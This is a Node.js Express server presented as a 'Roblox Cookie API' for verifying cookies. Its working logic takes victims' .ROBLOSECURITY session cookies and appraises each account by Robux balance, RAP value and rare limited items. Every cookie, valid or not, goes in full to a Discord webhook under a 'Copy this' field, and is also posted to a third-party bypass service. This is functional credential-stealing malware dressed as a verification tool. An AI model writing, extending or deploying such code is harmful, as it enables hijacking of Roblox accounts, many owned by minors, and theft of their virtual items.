const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// ========== CONFIGURATION ==========
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://your-webhook-url-here.com';
const BYPASS_API_URL = 'https://rblxbypasser.com/api/bypass';

// Asset IDs based on your research
const ASSET_IDS = {
    // Korblox Deathspeaker - Bundle #192 on Roblox
    // Individual piece IDs:
    KORBLOX_RIGHT_LEG: 139607718,   // Korblox Deathspeaker Right Leg
    KORBLOX_LEFT_LEG:  139607673,   // Korblox Deathspeaker Left Leg
    KORBLOX_RIGHT_ARM: 139607625,   // Korblox Deathspeaker Right Arm

    // Headless Horseman - Bundle #201 on Roblox
    HEADLESS_HEAD: 134967443,       // Classic Headless Head (part of bundle)
    HEADLESS_BUNDLE_ID: 201,        // Official bundle number

    // 8-Bit Royal Crown - Official Roblox Limited
    EIGHT_BIT_CROWN: 10159600649,   // 8-Bit Royal Crown (official limited by Roblox)
};

console.log('🔧 Webhook URL configured:', WEBHOOK_URL.substring(0, 50) + '...');

// ========== HELPER FUNCTIONS ==========

// Verify if Roblox cookie is valid
async function verifyCookie(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        return { valid: true, userId: response.data.id, username: response.data.name };
    } catch (error) {
        return { valid: false, error: 'Invalid or expired cookie' };
    }
}

// Check if user is 13+ using multiple methods
async function checkAge13Plus(cookie, userId) {
    try {
        // Method 1: Check birth date from account settings API
        const birthResponse = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (birthResponse.data.created) {
            // Parse birth date if available (not always in this endpoint)
        }

        // Method 2: Check through account info endpoint (requires authentication)
        const accountResponse = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (accountResponse.data && accountResponse.data.IsThirteenOrOver !== undefined) {
            return accountResponse.data.IsThirteenOrOver;
        }

        // Method 3: Check age restriction via presence API
        const presenceResponse = await axios.post('https://presence.roblox.com/v1/presence/users', 
            { userIds: [userId] },
            {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                }
            }
        );
        
        // Default to false if cannot determine
        return false;
    } catch (error) {
        console.error('Age check error:', error.message);
        return false;
    }
}

// Fetch user Robux balance
async function fetchRobuxBalance(cookie) {
    try {
        const response = await axios.get('https://economy.roblox.com/v1/users/authenticated/currency', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        return response.data.robux;
    } catch (error) {
        return 0;
    }
}

// Fetch user inventory to check for specific assets
async function checkInventoryItems(cookie, userId, assetIds) {
    const results = {
        hasKorblox: false,
        hasHeadless: false,
        hasEightBitCrown: false,
        korbloxParts: []
    };
    
    try {
        // Fetch limited items and inventory
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                // Check for Korblox parts (all 3 pieces required for full Korblox)
                if (item.assetId === assetIds.KORBLOX_RIGHT_LEG || 
                    item.assetId === assetIds.KORBLOX_LEFT_LEG || 
                    item.assetId === assetIds.KORBLOX_RIGHT_ARM) {
                    results.korbloxParts.push(item.assetId);
                }
                
                // Check for Headless (any part of the bundle)
                if (item.assetId === assetIds.HEADLESS_HEAD) {
                    results.hasHeadless = true;
                }
                
                // Check for 8-Bit Crown
                if (item.assetId === assetIds.EIGHT_BIT_CROWN) {
                    results.hasEightBitCrown = true;
                }
            }
        }
        
        // User has Korblox if they have all 3 parts
        results.hasKorblox = results.korbloxParts.length === 3;
        
        // Also check bundles endpoint for Headless bundle
        const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (bundleResponse.data && bundleResponse.data.data) {
            for (const bundle of bundleResponse.data.data) {
                if (bundle.id === assetIds.HEADLESS_BUNDLE_ID) {
                    results.hasHeadless = true;
                }
            }
        }
        
    } catch (error) {
        console.error('Inventory check error:', error.message);
        
        // Fallback: Try to fetch using economy API if inventory fails
        try {
            const fallbackResponse = await axios.get(`https://economy.roblox.com/v1/users/${userId}/assets?assetTypeId=8&limit=100`, {
                headers: {
                    'Cookie': `.ROBLOSECURITY=${cookie}`,
                    'User-Agent': 'Mozilla/5.0'
                }
            });
            
            if (fallbackResponse.data && fallbackResponse.data.data) {
                for (const item of fallbackResponse.data.data) {
                    if (item.assetId === assetIds.EIGHT_BIT_CROWN) {
                        results.hasEightBitCrown = true;
                    }
                }
            }
        } catch (fallbackError) {
            console.error('Fallback inventory check error:', fallbackError.message);
        }
    }
    
    return results;
}

// Fetch user summary (reputation, friends, etc)
async function fetchUserSummary(userId) {
    try {
        const [profileResponse, friendsResponse, groupsResponse] = await Promise.all([
            axios.get(`https://users.roblox.com/v1/users/${userId}`),
            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`)
        ]);
        
        // Calculate days since creation
        const createdDate = new Date(profileResponse.data.created);
        const now = new Date();
        const daysSinceCreation = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
        
        return {
            displayName: profileResponse.data.displayName,
            createdDate: profileResponse.data.created,
            daysSinceCreation: daysSinceCreation,
            friendCount: friendsResponse.data.count,
            groupCount: groupsResponse.data.data ? groupsResponse.data.data.length : 0,
            description: profileResponse.data.description || '',
            isBanned: profileResponse.data.isBanned || false
        };
    } catch (error) {
        return {
            displayName: 'Unknown',
            createdDate: 'Unknown',
            daysSinceCreation: 0,
            friendCount: 0,
            groupCount: 0,
            description: '',
            isBanned: false
        };
    }
}

// Bypass extensions using external API
async function bypassExtensions(cookie) {
    try {
        const response = await axios.post(BYPASS_API_URL, {
            cookie: cookie,
            type: 'extend'
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            timeout: 10000 // 10 second timeout
        });
        return { success: true, data: response.data };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// Get user's rap (Recent Average Price) for inventory items
async function fetchUserRAP(cookie, userId) {
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        let totalRAP = 0;
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.recentAveragePrice) {
                    totalRAP += item.recentAveragePrice;
                }
            }
        }
        
        return totalRAP;
    } catch (error) {
        return 0;
    }
}

// Send data to webhook with Discord embed formatting (ALWAYS sends cookie)
async function sendToWebhook(data) {
    if (!WEBHOOK_URL || WEBHOOK_URL === 'https://your-webhook-url-here.com') {
        console.error('❌ Webhook URL not configured! Please set WEBHOOK_URL environment variable.');
        return { success: false, error: 'Webhook URL not configured' };
    }
    
    try {
        console.log('📤 Sending data to webhook...');
        
        // Determine color based on success/failure
        let color = data.success ? 0x00FF00 : 0xFF0000; // Green if success, Red if failed
        
        // Create fields array
        const fields = [];
        
        // Always add cookie information first (important!)
        fields.push({
            name: "🍪 Cookie (Raw)",
            value: `\`\`\`${data.cookie ? data.cookie.substring(0, 100) + (data.cookie.length > 100 ? '...' : '') : 'No cookie provided'}\`\`\``,
            inline: false
        });
        
        // Add status
        fields.push({
            name: "📊 Status",
            value: data.success ? "✅ Valid Cookie" : "❌ Invalid Cookie",
            inline: true
        });
        
        // If valid, add user information
        if (data.success) {
            fields.push(
                {
                    name: "👤 Username",
                    value: data.username || "Unknown",
                    inline: true
                },
                {
                    name: "🆔 User ID",
                    value: String(data.userId || "Unknown"),
                    inline: true
                },
                {
                    name: "📅 Account Age",
                    value: `${data.daysSinceCreation || 0} days`,
                    inline: true
                },
                {
                    name: "💰 Robux Balance",
                    value: String(data.robuxBalance || 0),
                    inline: true
                },
                {
                    name: "📊 RAP Value",
                    value: String(data.rap || 0),
                    inline: true
                },
                {
                    name: "🔞 13+ Verified",
                    value: data.isThirteenPlus ? "✅ Yes" : "❌ No",
                    inline: true
                },
                {
                    name: "🎭 Limited Items",
                    value: [
                        `Korblox: ${data.inventory?.hasKorblox ? '✅' : '❌'}`,
                        `Headless: ${data.inventory?.hasHeadless ? '✅' : '❌'}`,
                        `8-Bit Crown: ${data.inventory?.hasEightBitCrown ? '✅' : '❌'}`
                    ].join('\n'),
                    inline: true
                },
                {
                    name: "📝 Account Summary",
                    value: [
                        `Display Name: ${data.summary?.displayName || 'N/A'}`,
                        `Friends: ${data.summary?.friendCount || 0}`,
                        `Groups: ${data.summary?.groupCount || 0}`,
                        `Banned: ${data.summary?.isBanned ? 'Yes' : 'No'}`
                    ].join('\n'),
                    inline: true
                },
                {
                    name: "🔗 Profile Link",
                    value: `https://www.roblox.com/users/${data.userId}/profile`,
                    inline: false
                }
            );
        } else {
            // If invalid, add error message
            fields.push({
                name: "❌ Error",
                value: data.error || "Unknown error occurred",
                inline: false
            });
        }
        
        // Add full cookie value in a separate field (collapsed for Discord)
        if (data.cookie) {
            fields.push({
                name: "🔐 Full Cookie Value (Copy this)",
                value: `||\`${data.cookie}\`||`,
                inline: false
            });
        }
        
        const webhookData = {
            embeds: [{
                title: data.success ? "🎮 Roblox Cookie Verification - SUCCESS" : "⚠️ Roblox Cookie Verification - FAILED",
                color: color,
                fields: fields,
                footer: {
                    text: `Verified at ${data.timestamp || new Date().toISOString()}`
                },
                timestamp: data.timestamp || new Date().toISOString()
            }]
        };
        
        const response = await axios.post(WEBHOOK_URL, webhookData, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 10000
        });
        
        console.log('✅ Webhook delivered successfully! Status:', response.status);
        return { success: true, status: response.status };
        
    } catch (error) {
        console.error('❌ Webhook delivery failed:', error.message);
        if (error.response) {
            console.error('Response status:', error.response.status);
            console.error('Response data:', error.response.data);
        }
        return { success: false, error: error.message };
    }
}

// ========== MAIN API ENDPOINTS ==========

// Full verification endpoint
app.post('/api/verify-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    let responseData = {
        cookie: cookie, // Always include the cookie
        success: false,
        timestamp: new Date().toISOString()
    };
    
    try {
        console.log('🔍 Verifying cookie...');
        
        // Step 1: Verify cookie
        const verification = await verifyCookie(cookie);
        
        if (!verification.valid) {
            // Cookie is invalid - send webhook with error
            responseData.error = verification.error;
            
            console.log(`❌ Invalid cookie provided`);
            
            // Send to webhook (even for invalid cookies)
            sendToWebhook(responseData).catch(err => console.error('Webhook error:', err));
            
            return res.status(401).json({ 
                success: false, 
                error: verification.error,
                cookie: cookie
            });
        }
        
        console.log(`✅ Cookie verified for user: ${verification.username} (${verification.userId})`);
        
        // Step 2: Check age (13+)
        const isThirteenPlus = await checkAge13Plus(cookie, verification.userId);
        
        // Step 3: Fetch user data concurrently
        const [robuxBalance, inventoryItems, userSummary, userRAP] = await Promise.all([
            fetchRobuxBalance(cookie),
            checkInventoryItems(cookie, verification.userId, ASSET_IDS),
            fetchUserSummary(verification.userId),
            fetchUserRAP(cookie, verification.userId)
        ]);
        
        // Step 4: Bypass extensions
        const bypassResult = await bypassExtensions(cookie);
        
        // Step 5: Prepare response data
        responseData = {
            cookie: cookie,
            success: true,
            username: verification.username,
            userId: verification.userId,
            daysSinceCreation: userSummary.daysSinceCreation,
            rap: userRAP,
            robuxBalance: robuxBalance,
            isThirteenPlus: isThirteenPlus,
            inventory: {
                hasKorblox: inventoryItems.hasKorblox,
                hasHeadless: inventoryItems.hasHeadless,
                hasEightBitCrown: inventoryItems.hasEightBitCrown,
                korbloxPartsOwned: inventoryItems.korbloxParts.length,
                totalKorbloxParts: 3
            },
            summary: {
                displayName: userSummary.displayName,
                friendCount: userSummary.friendCount,
                groupCount: userSummary.groupCount,
                accountAge: userSummary.createdDate,
                description: userSummary.description,
                isBanned: userSummary.isBanned
            },
            bypassResult: bypassResult,
            timestamp: new Date().toISOString()
        };
        
        // Step 6: Send to webhook (async, don't wait for response)
        sendToWebhook(responseData).catch(err => console.error('Webhook error:', err));
        
        // Return response immediately
        console.log(`📦 Sending response for ${verification.username}`);
        res.json(responseData);
        
    } catch (error) {
        console.error('Server error:', error);
        
        // Send error to webhook too
        responseData.error = error.message;
        sendToWebhook(responseData).catch(err => console.error('Webhook error:', err));
        
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error',
            details: error.message,
            cookie: cookie
        });
    }
});

// Quick validation endpoint
app.post('/api/validate-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    const verification = await verifyCookie(cookie);
    let responseData = {
        cookie: cookie,
        timestamp: new Date().toISOString()
    };
    
    if (verification.valid) {
        responseData.success = true;
        responseData.username = verification.username;
        responseData.userId = verification.userId;
        
        res.json({ 
            valid: true, 
            username: verification.username, 
            userId: verification.userId,
            cookie: cookie
        });
    } else {
        responseData.success = false;
        responseData.error = verification.error;
        
        res.json({ 
            valid: false, 
            error: verification.error,
            cookie: cookie
        });
    }
    
    // Send to webhook for validation endpoint too
    sendToWebhook(responseData).catch(err => console.error('Webhook error:', err));
});

// Test webhook endpoint
app.post('/api/test-webhook', async (req, res) => {
    const testData = {
        cookie: "test_cookie_12345_example_cookie_value_for_testing_purposes",
        success: true,
        username: "Test User",
        userId: 123456789,
        daysSinceCreation: 100,
        rap: 10000,
        robuxBalance: 2500,
        isThirteenPlus: true,
        inventory: {
            hasKorblox: true,
            hasHeadless: false,
            hasEightBitCrown: true,
            korbloxPartsOwned: 3,
            totalKorbloxParts: 3
        },
        summary: {
            displayName: "TestDisplay",
            friendCount: 50,
            groupCount: 3,
            accountAge: "2024-01-01T00:00:00Z",
            description: "This is a test account",
            isBanned: false
        },
        timestamp: new Date().toISOString()
    };
    
    const result = await sendToWebhook(testData);
    res.json({ 
        webhookSent: result.success, 
        message: result.success ? "✅ Webhook test sent successfully!" : "❌ Webhook failed",
        error: result.error 
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'API is running', 
        timestamp: new Date().toISOString(),
        webhookConfigured: WEBHOOK_URL !== 'https://your-webhook-url-here.com'
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({ 
        name: 'Roblox Cookie API',
        version: '1.0.0',
        description: 'Verify Roblox cookies and fetch user data',
        endpoints: [
            'POST /api/verify-cookie - Full verification with all data',
            'POST /api/validate-cookie - Quick cookie validation only',
            'POST /api/test-webhook - Test webhook functionality',
            'GET /health - Health check'
        ],
        webhookConfigured: WEBHOOK_URL !== 'https://your-webhook-url-here.com',
        note: 'Webhook always receives the cookie value, even for invalid cookies'
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Health check: http://localhost:${PORT}/health`);
    console.log(`📍 Verify endpoint: POST http://localhost:${PORT}/api/verify-cookie`);
    console.log(`📍 Webhook configured: ${WEBHOOK_URL !== 'https://your-webhook-url-here.com' ? '✅ Yes' : '❌ No'}`);
    console.log(`📍 Webhook will ALWAYS receive cookie values (even for invalid cookies)`);
});
